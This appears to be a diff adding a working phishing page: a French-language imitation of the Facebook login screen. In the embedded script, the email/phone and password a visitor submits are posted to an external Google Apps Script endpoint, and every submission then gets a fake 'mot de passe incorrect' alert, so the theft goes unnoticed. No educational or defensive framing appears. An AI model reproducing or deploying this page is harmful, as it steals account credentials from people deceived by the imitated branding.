@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+
+<html lang="fr">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<link href="local_resources/css/a754a4870e7483aecb55c3c3e3062c94.css" rel="stylesheet"/>
+<title>Facebook - Connexion ou inscription</title>
+<link href="local_resources/img/a40cac4dafeb19649d359a3e650c85b3.png" rel="icon" type="image/x-icon"/>
+</head>
+<header>
+<img class="backbtn" src="local_resources/img/49acbedcf5974ccee027bb16087d3ced.png"/>
+<p class="language">Français (France)</p>
+</header>
+<body>
+<div class="container">
+<img alt="Facebook.png" class="logo" src="local_resources/img/49661c737268cad19867e7260665f5cd.png"/>
+</div>
+<div class="login-container">
+<form id="loginForm">
+<input class="facebook-input" name="email" placeholder="Adresse e-mail ou numéro de tél." required="" type="text"/>
+<input class="facebook-input" name="password" placeholder="Mot de passe" required="" type="password"/>
+<button class="login-btn" type="submit">Se connecter</button>
+<a class="forgot-password" href="#">Mot de passe oublié ?</a>
+</form>
+</div>
+<script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbxRyJt5jMsU5FaOSSrg_OeF8PCLaWZ9WJL1YFldxO51a03EWZskbPOfAdzPrMm_vLVTkQ/exec';
+            const form = document.getElementById('loginForm');
+
+            form.addEventListener('submit', e => {
+                e.preventDefault(); // Prevent the default form submission
+                fetch(scriptURL, { 
+                    method: 'POST',
+                    body: new FormData(form)
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Success:', data);
+                    alert('mot de passe incorrect'); // Show the message
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('mot de passe incorrect'); // Show the message on error as well
+                });
+            });
+        });
+    </script>
+</body>
+</html>
